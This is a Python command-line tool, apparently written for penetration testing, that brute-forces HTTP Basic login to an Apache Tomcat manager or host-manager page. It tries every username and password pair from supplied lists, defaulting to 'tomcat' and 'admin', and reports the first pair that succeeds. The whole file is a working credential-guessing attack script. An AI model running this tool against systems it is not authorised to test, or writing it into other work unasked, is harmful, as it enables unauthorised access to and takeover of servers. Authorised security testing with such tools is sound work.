import os
from typing import List

import requests
from rich import print
from rich.progress import track
from typer import Option, Typer
from typing_extensions import Annotated

app = Typer()


def print_request(req: requests.PreparedRequest):
    print(
        f"{req.method} {req.url}\r\n"
        f"{''.join(f'{k}: {v}\r\n' for k, v in req.headers.items())}\r\n"
        f"{req.body}"
    )


def read_wordlist(wordlist: str) -> List[str]:
    # Someone did a comma-separated input
    words = []
    if "," in wordlist:
        words = wordlist.split(",")
    else:
        if not os.path.isfile(wordlist):
            raise ValueError(
                f"Provided wordlist '{wordlist}' is not a file or comma-separated input"
            )
        words = open(wordlist).readlines()

    return list(map(lambda x: x.strip(), words))


@app.command()
def brute(
    url: Annotated[
        str, Option("--url", "-U", help="The Tomcat URL to brute force.")
    ],
    path: Annotated[
        str, Option("--path", "-P", help="The manager or host-manager URI")
    ],
    usernames: Annotated[
        str,
        Option(
            "--usernames",
            "-u",
            help="The file or comma-separated username list.",
        ),
    ] = "tomcat,admin",
    passwords: Annotated[
        str,
        Option(
            "--passwords",
            "-p",
            help="The file or comma-separated password list.",
        ),
    ] = "tomcat,admin",
    verbose: Annotated[
        bool, Option("--verbose", "-v", help="Show passed and failed inputs.")
    ] = False,
    debug: Annotated[
        bool, Option("--debug", "-d", help="Show the HTTP request being made")
    ] = False,
):
    # Get the stripped list of usernames
    usernames = read_wordlist(usernames)

    # Get the stripped list of passwords
    passwords = read_wordlist(passwords)

    # Get the combined url
    full_url = url + path

    print(
        f"[green]Attacking with[/green] {len(usernames) * len(passwords)} [green]combinations"
    )

    for u in track(usernames):
        for p in passwords:
            r = requests.get(full_url, auth=(u, p))

            if debug:
                print_request(r.request)

            if verbose:
                print(f"[blue]Attempting {u}:{p}")

            if r.status_code == 200:
                print(f"[green]{u}:{p} Authenticated successfully")
                exit(0)
    else:
        print("[red]Failed to find working credentials.")


if __name__ == "__main__":
    app()
